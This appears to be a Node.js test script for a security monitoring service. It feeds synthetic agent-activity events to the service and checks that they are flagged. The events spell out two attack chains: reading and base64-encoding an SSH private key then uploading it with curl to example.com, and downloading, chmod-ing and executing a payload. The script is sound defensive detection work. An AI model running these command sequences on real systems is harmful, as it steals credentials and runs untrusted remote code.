#!/usr/bin/env node

import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';

const baseUrl = (process.env.ANYSENTRY_API_BASE
  ?? 'http://127.0.0.1:29653/security-center').replace(/\/$/, '');
const adminToken = process.env.ANYSENTRY_ADMIN_TOKEN?.trim();
const runId = `flink-${Date.now()}-${randomUUID().slice(0, 8)}`;
const agentId = `${runId}-agent`;
const sessionId = `${runId}-session`;
const workspacePath = `repo://${runId}/workspace`;

async function request(path, body) {
  const response = await fetch(`${baseUrl}${path}`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      ...(adminToken && path !== '/ingest' ? { authorization: `Bearer ${adminToken}` } : {}),
    },
    body: JSON.stringify(body),
  });
  const text = await response.text();
  const payload = text ? JSON.parse(text) : undefined;
  if (!response.ok) throw new Error(`${path} returned ${response.status}: ${text}`);
  return payload?.data ?? payload;
}

function line(event) {
  return JSON.stringify({
    identity: { agent: agentId, session: sessionId, task: `${runId}-task` },
    process: {
      pid: 73001,
      ppid: 72999,
      uid: 1000,
      comm: 'stream-verifier',
      exe: '/usr/bin/stream-verifier',
      cwd: '/workspace/project',
      start_time_ns: '1785000000000000000',
    },
    event,
  });
}

async function ingest(sourceId, sourceEventId, event) {
  const result = await request('/ingest', {
    line: line(event),
    sourceEventId,
    sourceId,
    collectorId: `${runId}-collector`,
    nodeName: `${runId}-node`,
    sourceType: 'observer',
    workspacePath,
    attribution: {
      monitored: true,
      agentScopeId: agentId,
      agentDisplayName: agentId,
      rootPid: 73001,
      confidence: 0.99,
      reason: 'authoritative_anchor',
      source: 'self_register',
    },
  });
  assert.equal(result.accepted, true, JSON.stringify(result));
  assert.ok(result.eventId);
  return result.eventId;
}

async function pause() {
  await new Promise((resolve) => setTimeout(resolve, 10));
}

const source = await request('/sources', {
  name: `${runId} streaming verifier`,
  type: 'observer',
  enabled: true,
  requireToken: false,
  collectorId: `${runId}-collector`,
  workspacePath,
  owner: 'verify-streaming-runtime',
  tags: ['streaming-phase1', runId],
});
const sourceId = source.source?.sourceId;
assert.ok(sourceId, JSON.stringify(source));

await ingest(sourceId, `${runId}-read`, {
  FileAccess: {
    pid: 73001,
    uid: 1000,
    path: `/home/${runId}/.ssh/id_rsa`,
    access: 'read',
  },
});
await pause();
await ingest(sourceId, `${runId}-encode`, {
  ToolExec: {
    pid: 73001,
    uid: 1000,
    cwd: '/workspace/project',
    argv: ['base64', `/home/${runId}/.ssh/id_rsa`],
    exec_confirmed: true,
  },
});
await pause();
await ingest(sourceId, `${runId}-egress`, {
  ToolExec: {
    pid: 73001,
    uid: 1000,
    cwd: '/workspace/project',
    argv: ['curl', '-fsS', '--max-time', '5', '-o', '/dev/null', 'https://example.com/upload'],
    exec_confirmed: true,
  },
});
await pause();

const downloadedPath = `/tmp/${runId}-payload`;
await ingest(sourceId, `${runId}-download`, {
  ToolExec: {
    pid: 73001,
    uid: 1000,
    cwd: '/workspace/project',
    argv: ['curl', '--output', downloadedPath, 'https://example.com/payload'],
    exec_confirmed: true,
  },
});
await pause();
await ingest(sourceId, `${runId}-write`, {
  FileAccess: {
    pid: 73001,
    uid: 1000,
    path: downloadedPath,
    write: true,
  },
});
await pause();
await ingest(sourceId, `${runId}-chmod`, {
  ToolExec: {
    pid: 73001,
    uid: 1000,
    cwd: '/workspace/project',
    argv: ['chmod', '+x', downloadedPath],
    exec_confirmed: true,
  },
});
await pause();
await ingest(sourceId, `${runId}-execute`, {
  ToolExec: {
    pid: 73001,
    uid: 1000,
    cwd: '/workspace/project',
    argv: [downloadedPath],
    exec_confirmed: true,
  },
});

const deadline = Date.now() + Number(process.env.ANYSENTRY_STREAM_VERIFY_TIMEOUT_MS ?? 150_000);
let findings;
while (Date.now() < deadline) {
  findings = await request('/stream/findings', { timeType: 'last_3h', limit: 200 });
  const temporal = findings.compositeJudgments?.filter((item) =>
    item.agentType === agentId
    && item.ruleVersion === 'temporal-episode-v1'
    && item.status === 'succeeded');
  const legacy = findings.compositeJudgments?.filter((item) =>
    item.agentType === agentId
    && (item.ruleVersion === 'composite-risk-v2'
      || item.ruleVersion === 'supply-chain-exploit-v1'));
  assert.equal(legacy?.length, 0, 'legacy label-window episodes must not duplicate Temporal Episodes');
  const exfiltration = temporal?.find((item) =>
    item.evidence.map((evidence) => evidence.operation).join(',') === 'file_read,encode,egress');
  const downloadExecute = temporal?.find((item) =>
    item.evidence.map((evidence) => evidence.operation).join(',') === 'download,file_write,chmod,execute');
  if (exfiltration && downloadExecute) {
    assert.equal(findings.enabled, true);
    assert.equal(exfiltration.shadow, true);
    assert.equal(exfiltration.synthetic, true);
    assert.equal(exfiltration.classification, 'simulation');
    assert.equal(exfiltration.verdict, 'allow');
    assert.equal(exfiltration.attackType, 'sensitive-data-exfiltration');
    assert.deepEqual(exfiltration.evidence.map((item) => item.operation), [
      'file_read',
      'encode',
      'egress',
    ]);
    assert.equal(downloadExecute.shadow, true);
    assert.equal(downloadExecute.synthetic, true);
    assert.equal(downloadExecute.classification, 'simulation');
    assert.equal(downloadExecute.verdict, 'allow');
    assert.equal(downloadExecute.attackType, 'download-and-execute');
    assert.deepEqual(downloadExecute.evidence.map((item) => item.operation), [
      'download',
      'file_write',
      'chmod',
      'execute',
    ]);
    console.log(JSON.stringify({
      runId,
      sourceId,
      episodes: [exfiltration, downloadExecute].map((item) => ({
        episodeId: item.episodeId,
        revision: item.revision,
        status: item.status,
        verdict: item.verdict,
        classification: item.classification,
        evidenceEventIds: item.evidenceEventIds,
      })),
    }, null, 2));
    console.log('Temporal Episode runtime verification passed');
    process.exit(0);
  }
  await new Promise((resolve) => setTimeout(resolve, 500));
}

throw new Error(`stream findings were not produced within the deadline: ${JSON.stringify(findings)}`);
